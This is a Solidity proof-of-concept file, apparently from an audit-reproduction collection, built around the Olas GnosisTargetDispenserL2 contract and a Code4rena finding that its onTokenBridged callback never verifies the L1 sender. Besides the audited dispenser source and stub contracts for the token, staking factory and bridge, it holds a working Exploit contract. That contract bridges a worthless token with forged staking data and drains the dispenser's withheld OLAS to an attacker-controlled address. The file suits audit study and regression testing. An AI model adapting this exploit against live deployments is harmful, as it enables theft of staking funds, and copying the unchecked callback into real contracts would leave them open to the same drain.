// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

// =============================================================================
// AuditVault #34921 — Olas H-02 (Code4rena 2024-05-olas, commit 3ce502e)
// "Arbitrary tokens and data can be bridged to GnosisTargetDispenserL2 to
//  manipulate staking incentives"
//
// This is the REAL audited source (DefaultTargetDispenserL2 + GnosisTargetDispenserL2,
// byte-identical to the pinned commit) plus minimal real-interface stand-ins for the
// external pieces the dispenser merely *calls* (an ERC20 OLAS token, the Olas
// StakingFactory, and the Gnosis HomeOmniBridge mediator). The Exploit contract
// deploys the real dispenser and drives the real vulnerable path
//   onTokenBridged -> _receiveMessage -> _processData
// with NO cheatcodes, redirecting the dispenser's withheld OLAS to an
// attacker-controlled target.
// =============================================================================

// --------------------------- REAL: IBridgeErrors -----------------------------
interface IBridgeErrors {
    error ManagerOnly(address sender, address manager);
    error OwnerOnly(address sender, address owner);
    error ZeroAddress();
    error ZeroValue();
    error IncorrectDataLength(uint256 expected, uint256 provided);
    error LowerThan(uint256 provided, uint256 expected);
    error Overflow(uint256 provided, uint256 max);
    error TargetRelayerOnly(address provided, address expected);
    error WrongMessageSender(address provided, address expected);
    error WrongChainId(uint256 provided, uint256 expected);
    error TargetAmountNotQueued(address target, uint256 amount, uint256 batchNonce);
    error InsufficientBalance(uint256 provided, uint256 expected);
    error TransferFailed(address token, address from, address to, uint256 amount);
    error AlreadyDelivered(bytes32 deliveryHash);
    error WrongAmount(uint256 provided, uint256 expected);
    error WrongTokenAddress(address provided, address expected);
    error Paused();
    error Unpaused();
    error ReentrancyGuard();
    error WrongAccount(address account);
}

// -------------------- REAL: DefaultTargetDispenserL2 -------------------------
// Staking interface
interface IStaking {
    function deposit(uint256 amount) external;
}

// Staking factory interface
interface IStakingFactory {
    function verifyInstanceAndGetEmissionsAmount(address instance) external view returns (uint256 amount);
}

// Necessary ERC20 token interface
interface IToken {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

/// @title DefaultTargetDispenserL2 - Smart contract for processing tokens and data received on L2, and data sent back to L1.
abstract contract DefaultTargetDispenserL2 is IBridgeErrors {
    event OwnerUpdated(address indexed owner);
    event FundsReceived(address indexed sender, uint256 value);
    event StakingTargetDeposited(address indexed target, uint256 amount);
    event AmountWithheld(address indexed target, uint256 amount);
    event StakingRequestQueued(bytes32 indexed queueHash, address indexed target, uint256 amount,
        uint256 batchNonce, uint256 paused);
    event MessagePosted(uint256 indexed sequence, address indexed messageSender, address indexed l1Processor,
        uint256 amount);
    event MessageReceived(address indexed sender, uint256 chainId, bytes data);
    event WithheldAmountSynced(address indexed sender, uint256 amount);
    event Drain(address indexed owner, uint256 amount);
    event TargetDispenserPaused();
    event TargetDispenserUnpaused();
    event Migrated(address indexed sender, address indexed newL2TargetDispenser, uint256 amount);

    bytes4 public constant RECEIVE_MESSAGE = bytes4(keccak256(bytes("receiveMessage(bytes)")));
    uint256 public constant MAX_CHAIN_ID = type(uint64).max / 2 - 36;
    uint256 public constant GAS_LIMIT = 300_000;
    uint256 public constant MAX_GAS_LIMIT = 2_000_000;
    address public immutable olas;
    address public immutable stakingFactory;
    address public immutable l2MessageRelayer;
    address public immutable l1DepositProcessor;
    uint256 public immutable l1SourceChainId;
    uint256 public withheldAmount;
    uint256 public stakingBatchNonce;
    address public owner;
    uint8 public paused;
    uint8 internal _locked;

    mapping(bytes32 => bool) public stakingQueueingNonces;

    constructor(
        address _olas,
        address _stakingFactory,
        address _l2MessageRelayer,
        address _l1DepositProcessor,
        uint256 _l1SourceChainId
    ) {
        if (_olas == address(0) || _stakingFactory == address(0) || _l2MessageRelayer == address(0)
            || _l1DepositProcessor == address(0)) {
            revert ZeroAddress();
        }
        if (_l1SourceChainId == 0) {
            revert ZeroValue();
        }
        if (_l1SourceChainId > MAX_CHAIN_ID) {
            revert Overflow(_l1SourceChainId, MAX_CHAIN_ID);
        }
        olas = _olas;
        stakingFactory = _stakingFactory;
        l2MessageRelayer = _l2MessageRelayer;
        l1DepositProcessor = _l1DepositProcessor;
        l1SourceChainId = _l1SourceChainId;
        owner = msg.sender;
        paused = 1;
        _locked = 1;
    }

    /// @dev Processes the data received from L1.
    function _processData(bytes memory data) internal {
        if (_locked > 1) {
            revert ReentrancyGuard();
        }
        _locked = 2;

        (address[] memory targets, uint256[] memory amounts) = abi.decode(data, (address[], uint256[]));

        uint256 batchNonce = stakingBatchNonce;
        uint256 localWithheldAmount = 0;
        uint256 localPaused = paused;

        for (uint256 i = 0; i < targets.length; ++i) {
            address target = targets[i];
            uint256 amount = amounts[i];

            bytes memory verifyData = abi.encodeCall(IStakingFactory.verifyInstanceAndGetEmissionsAmount, target);
            (bool success, bytes memory returnData) = stakingFactory.call(verifyData);

            uint256 limitAmount;
            if (success && returnData.length == 32) {
                limitAmount = abi.decode(returnData, (uint256));
            }

            if (limitAmount == 0) {
                localWithheldAmount += amount;
                emit AmountWithheld(target, amount);
                continue;
            }

            if (amount > limitAmount) {
                uint256 targetWithheldAmount = amount - limitAmount;
                localWithheldAmount += targetWithheldAmount;
                amount = limitAmount;
                emit AmountWithheld(target, targetWithheldAmount);
            }

            if (IToken(olas).balanceOf(address(this)) >= amount && localPaused == 1) {
                IToken(olas).approve(target, amount);
                IStaking(target).deposit(amount);
                emit StakingTargetDeposited(target, amount);
            } else {
                bytes32 queueHash = keccak256(abi.encode(target, amount, batchNonce));
                stakingQueueingNonces[queueHash] = true;
                emit StakingRequestQueued(queueHash, target, amount, batchNonce, localPaused);
            }
        }
        stakingBatchNonce = batchNonce + 1;

        if (localWithheldAmount > 0) {
            withheldAmount += localWithheldAmount;
        }

        _locked = 1;
    }

    function _sendMessage(uint256 amount, bytes memory bridgePayload) internal virtual;

    /// @dev Receives a message from L1.
    function _receiveMessage(
        address messageRelayer,
        address sourceProcessor,
        bytes memory data
    ) internal virtual {
        if (messageRelayer != l2MessageRelayer) {
            revert TargetRelayerOnly(messageRelayer, l2MessageRelayer);
        }
        if (sourceProcessor != l1DepositProcessor) {
            revert WrongMessageSender(sourceProcessor, l1DepositProcessor);
        }
        emit MessageReceived(l1DepositProcessor, l1SourceChainId, data);
        _processData(data);
    }

    function changeOwner(address newOwner) external {
        if (msg.sender != owner) {
            revert OwnerOnly(msg.sender, owner);
        }
        if (newOwner == address(0)) {
            revert ZeroAddress();
        }
        owner = newOwner;
        emit OwnerUpdated(newOwner);
    }

    function redeem(address target, uint256 amount, uint256 batchNonce) external {
        if (_locked > 1) {
            revert ReentrancyGuard();
        }
        _locked = 2;
        if (paused == 2) {
            revert Paused();
        }
        bytes32 queueHash = keccak256(abi.encode(target, amount, batchNonce));
        bool queued = stakingQueueingNonces[queueHash];
        if (!queued) {
            revert TargetAmountNotQueued(target, amount, batchNonce);
        }
        uint256 olasBalance = IToken(olas).balanceOf(address(this));
        if (olasBalance >= amount) {
            IToken(olas).approve(target, amount);
            IStaking(target).deposit(amount);
            emit StakingTargetDeposited(target, amount);
            stakingQueueingNonces[queueHash] = false;
        } else {
            revert InsufficientBalance(olasBalance, amount);
        }
        _locked = 1;
    }

    function processDataMaintenance(bytes memory data) external {
        if (msg.sender != owner) {
            revert OwnerOnly(msg.sender, owner);
        }
        _processData(data);
    }

    function syncWithheldTokens(bytes memory bridgePayload) external payable {
        if (_locked > 1) {
            revert ReentrancyGuard();
        }
        _locked = 2;
        if (paused == 2) {
            revert Paused();
        }
        uint256 amount = withheldAmount;
        if (amount == 0) {
            revert ZeroValue();
        }
        withheldAmount = 0;
        _sendMessage(amount, bridgePayload);
        emit WithheldAmountSynced(msg.sender, amount);
        _locked = 1;
    }

    function pause() external {
        if (msg.sender != owner) {
            revert OwnerOnly(msg.sender, owner);
        }
        paused = 2;
        emit TargetDispenserPaused();
    }

    function unpause() external {
        if (msg.sender != owner) {
            revert OwnerOnly(msg.sender, owner);
        }
        paused = 1;
        emit TargetDispenserUnpaused();
    }

    function drain() external returns (uint256 amount) {
        if (_locked > 1) {
            revert ReentrancyGuard();
        }
        _locked = 2;
        if (msg.sender != owner) {
            revert OwnerOnly(msg.sender, owner);
        }
        amount = address(this).balance;
        if (amount == 0) {
            revert ZeroValue();
        }
        (bool success, ) = msg.sender.call{value: amount}("");
        if (!success) {
            revert TransferFailed(address(0), address(this), msg.sender, amount);
        }
        emit Drain(msg.sender, amount);
        _locked = 1;
    }

    function migrate(address newL2TargetDispenser) external {
        if (_locked > 1) {
            revert ReentrancyGuard();
        }
        _locked = 2;
        if (msg.sender != owner) {
            revert OwnerOnly(msg.sender, owner);
        }
        if (paused == 1) {
            revert Unpaused();
        }
        if (newL2TargetDispenser.code.length == 0) {
            revert WrongAccount(newL2TargetDispenser);
        }
        if (newL2TargetDispenser == address(this)) {
            revert WrongAccount(address(this));
        }
        uint256 amount = IToken(olas).balanceOf(address(this));
        if (amount > 0) {
            bool success = IToken(olas).transfer(newL2TargetDispenser, amount);
            if (!success) {
                revert TransferFailed(olas, address(this), newL2TargetDispenser, amount);
            }
        }
        owner = address(0);
        emit Migrated(msg.sender, newL2TargetDispenser, amount);
    }

    receive() external payable {
        if (owner == address(0)) {
            revert TransferFailed(address(0), msg.sender, address(this), msg.value);
        }
        emit FundsReceived(msg.sender, msg.value);
    }
}

// -------------------- REAL: GnosisTargetDispenserL2 -------------------------
interface IBridge {
    function requireToPassMessage(address target, bytes memory data, uint256 maxGasLimit) external returns (bytes32);
    function messageSender() external returns (address);
}

/// @title GnosisTargetDispenserL2
contract GnosisTargetDispenserL2 is DefaultTargetDispenserL2 {
    uint256 public constant BRIDGE_PAYLOAD_LENGTH = 32;
    address public immutable l2TokenRelayer;

    constructor(
        address _olas,
        address _proxyFactory,
        address _l2MessageRelayer,
        address _l1DepositProcessor,
        uint256 _l1SourceChainId,
        address _l2TokenRelayer
    )
        DefaultTargetDispenserL2(_olas, _proxyFactory, _l2MessageRelayer, _l1DepositProcessor, _l1SourceChainId)
    {
        if (_l2TokenRelayer == address(0)) {
            revert ZeroAddress();
        }
        l2TokenRelayer = _l2TokenRelayer;
    }

    /// @inheritdoc DefaultTargetDispenserL2
    function _sendMessage(uint256 amount, bytes memory bridgePayload) internal override {
        if (bridgePayload.length != BRIDGE_PAYLOAD_LENGTH) {
            revert IncorrectDataLength(BRIDGE_PAYLOAD_LENGTH, bridgePayload.length);
        }
        uint256 gasLimitMessage = abi.decode(bridgePayload, (uint256));
        if (gasLimitMessage < GAS_LIMIT) {
            gasLimitMessage = GAS_LIMIT;
        }
        if (gasLimitMessage > MAX_GAS_LIMIT) {
            gasLimitMessage = MAX_GAS_LIMIT;
        }
        bytes memory data = abi.encodeWithSelector(RECEIVE_MESSAGE, abi.encode(amount));
        bytes32 iMsg = IBridge(l2MessageRelayer).requireToPassMessage(l1DepositProcessor, data, gasLimitMessage);
        emit MessagePosted(uint256(iMsg), msg.sender, l1DepositProcessor, amount);
    }

    /// @dev Processes a message received from the AMB Contract Proxy (Home) contract.
    function receiveMessage(bytes memory data) external {
        address processor = IBridge(l2MessageRelayer).messageSender();
        _receiveMessage(msg.sender, processor, data);
    }

    /// @dev Processes the data received together with the token transfer from L1.
    function onTokenBridged(address, uint256, bytes calldata data) external {
        // Check for the message to come from the L2 token relayer
        if (msg.sender != l2TokenRelayer) {
            revert TargetRelayerOnly(msg.sender, l2TokenRelayer);
        }

        // @> VULN: the L1 sender is never checked. `l1DepositProcessor` is hardcoded
        // as the trusted source, so ANY token bridge routed here (by anyone) is
        // processed as authentic L1 staking data.
        _receiveMessage(l2MessageRelayer, l1DepositProcessor, data);
    }
}

// ============================ STAND-INS =====================================

/// @dev Minimal but faithful ERC20 (the dispenser treats OLAS as an opaque IToken).
contract ERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "ERC20: allowance");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "ERC20: balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

/// @dev Stand-in for Olas StakingFactory: returns a per-target emissions cap for a
///      *registered* staking proxy. An attacker permissionlessly deploys a real
///      proxy, so this returns a non-zero cap for their chosen target.
contract StakingFactoryStub {
    uint256 public emissions;

    function setEmissions(uint256 v) external {
        emissions = v;
    }

    function verifyInstanceAndGetEmissionsAmount(address) external view returns (uint256) {
        return emissions;
    }
}

interface IERC20Receiver {
    function onTokenBridged(address token, uint256 value, bytes calldata data) external;
}

/// @dev Minimal real-interface stand-in for the Gnosis HomeOmniBridge mediator (the
///      `l2TokenRelayer`). Mirrors omnibridge BasicOmnibridge: it credits the bridged
///      tokens to the receiver, then invokes the receiver's onTokenBridged callback
///      WITHOUT forwarding the L1 sender — the exact gap H-02 exploits.
contract HomeOmniBridgeStub {
    function relayTokensAndCall(address token, address receiver, uint256 amount, bytes calldata data) external {
        if (token != address(0)) ERC20(token).mint(receiver, amount);
        IERC20Receiver(receiver).onTokenBridged(token, amount, data);
    }
}

// ============================== EXPLOIT ======================================

/// @dev The attacker contract. It is BOTH the orchestrator and the malicious
///      "staking target": its deposit() pulls the approved OLAS into itself,
///      proving the withheld incentives were redirected to an attacker address.
contract Exploit {
    ERC20 public olas;
    ERC20 public junk;
    StakingFactoryStub public factory;
    HomeOmniBridgeStub public bridge;
    GnosisTargetDispenserL2 public dispenser;

    address internal constant L2_MESSAGE_RELAYER = address(0xA11B);
    address internal constant L1_DEPOSIT_PROCESSOR = address(0x1111); // only legit L1 sender
    uint256 internal constant WITHHELD = 100 ether;

    uint256 public stolen;

    constructor() {
        // Deploy order fixes the dispenser's CREATE address (Exploit nonce 5).
        olas = new ERC20("Autonolas", "OLAS");
        junk = new ERC20("Junk", "JUNK");
        factory = new StakingFactoryStub();
        factory.setEmissions(type(uint256).max); // attacker's registered proxy verifies
        bridge = new HomeOmniBridgeStub();
        dispenser = new GnosisTargetDispenserL2(
            address(olas),
            address(factory),
            L2_MESSAGE_RELAYER,
            L1_DEPOSIT_PROCESSOR,
            1,
            address(bridge)
        );
        // Dispenser holds OLAS staking incentives awaiting distribution.
        olas.mint(address(dispenser), WITHHELD);
    }

    /// @dev Called by the dispenser during _processData. Pulls the OLAS it just
    ///      approved to us — this is the attacker-controlled "staking target".
    function deposit(uint256 amount) external {
        olas.transferFrom(msg.sender, address(this), amount);
    }

    function run() external {
        // Forge staking data that routes the dispenser's OLAS to us.
        address[] memory targets = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        targets[0] = address(this);
        amounts[0] = WITHHELD;
        bytes memory data = abi.encode(targets, amounts);

        // Bridge a worthless token to the dispenser with the forged data. We are not
        // the L1 deposit processor and not the owner — yet the callback is trusted.
        bridge.relayTokensAndCall(address(junk), address(dispenser), 1, data);

        stolen = olas.balanceOf(address(this));
        require(stolen == WITHHELD, "exploit did not redirect withheld OLAS");
        require(olas.balanceOf(address(dispenser)) == 0, "dispenser not drained");
    }
}
